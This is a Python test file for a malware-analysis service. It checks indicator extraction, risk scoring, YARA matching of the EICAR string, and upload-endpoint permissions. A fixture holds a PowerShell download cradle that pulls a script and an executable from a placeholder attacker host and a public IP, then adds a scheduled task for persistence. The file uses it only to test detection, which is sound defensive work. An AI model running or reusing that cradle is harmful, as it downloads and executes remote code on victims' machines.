import io

from fastapi.testclient import TestClient

from app.main import app
from app.modules.file_analysis.analyzers.network_indicators import extract_network_indicators
from app.modules.file_analysis.analyzers.risk import assess, find_suspicious_strings
from app.modules.file_analysis.analyzers.yara import scan_with_yara, yara_available
from app.modules.file_analysis.service import file_analysis_service

client = TestClient(app)

EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
DOWNLOAD_CRADLE = (
    b'powershell -WindowStyle Hidden -enc AAAA; '
    b'IEX (New-Object Net.WebClient).DownloadString("http://malicious.example.com/a.ps1"); '
    b'cmd.exe /c certutil -urlcache -f http://185.220.101.1/b.exe b.exe & '
    b'schtasks /create /tn persist /tr b.exe'
)


def _headers(email: str = "analyst@local") -> dict[str, str]:
    token = client.post("/api/v1/auth/login", json={"email": email, "password": "x"}).json()[
        "access_token"
    ]
    return {"Authorization": f"Bearer {token}"}


# --- network indicators -------------------------------------------------------

def test_network_indicators_extracts_urls_and_public_ips():
    data = b"connect to http://evil.example.com/x and 8.8.8.8 but not 192.168.1.1 or 127.0.0.1"
    result = extract_network_indicators(data)
    assert "http://evil.example.com/x" in result["urls"]
    assert "8.8.8.8" in result["ips"]
    assert "192.168.1.1" not in result["ips"]
    assert "127.0.0.1" not in result["ips"]


# --- suspicious strings / risk ----------------------------------------------

def test_find_suspicious_strings():
    labels = find_suspicious_strings(DOWNLOAD_CRADLE)
    assert "PowerShell execution" in labels


def test_benign_text_scores_low():
    out = assess(
        data=b"hello world, this is a normal document about cats",
        metadata={"extension_matches_content": True, "likely_packed": False},
        yara_matches=[],
        signature_match={"matched": False},
        network={"urls": [], "ips": [], "domains": []},
    )
    assert out["risk"]["level"] == "low"
    assert out["risk"]["classification"] == "Likely Benign"


def test_signature_hit_drives_high_risk():
    out = assess(
        data=b"x",
        metadata={"extension_matches_content": True, "likely_packed": False},
        yara_matches=[],
        signature_match={"matched": True, "name": "ThreatLens.Demo.Trojan", "type": "Trojan", "severity": "high"},
        network={"urls": [], "ips": [], "domains": []},
    )
    assert out["risk"]["level"] == "high"
    assert "Trojan" in out["risk"]["classification"]


# --- yara -------------------------------------------------------------------

def test_yara_matches_eicar_when_available():
    if not yara_available():
        return  # environment without yara-python; analyzer degrades gracefully
    matches = scan_with_yara(EICAR)
    assert any(m["rule"] == "EICAR_Test_File" for m in matches)


# --- full pipeline + endpoint ---------------------------------------------

def test_pipeline_flags_download_cradle():
    result = file_analysis_service.analyze_static_file("cradle.ps1", DOWNLOAD_CRADLE)
    assert result.risk.level == "high"
    assert result.network_indicators.urls
    assert result.suspicious_indicators


def test_upload_endpoint_runs_full_analysis():
    resp = client.post(
        "/api/v1/files/upload",
        files={"file": ("invoice.exe", io.BytesIO(DOWNLOAD_CRADLE), "application/octet-stream")},
        headers=_headers(),
    )
    assert resp.status_code == 201
    body = resp.json()
    assert body["risk"]["score"] > 0
    assert body["hashes"]["sha256"]
    assert body["metadata"]["extension_matches_content"] is False  # .exe but text content


def test_upload_endpoint_requires_role():
    resp = client.post(
        "/api/v1/files/upload",
        files={"file": ("x.txt", io.BytesIO(b"hi"), "text/plain")},
        headers=_headers("soc@local"),
    )
    assert resp.status_code == 403


def test_upload_rejects_empty_file():
    resp = client.post(
        "/api/v1/files/upload",
        files={"file": ("x.txt", io.BytesIO(b""), "text/plain")},
        headers=_headers(),
    )
    assert resp.status_code == 400
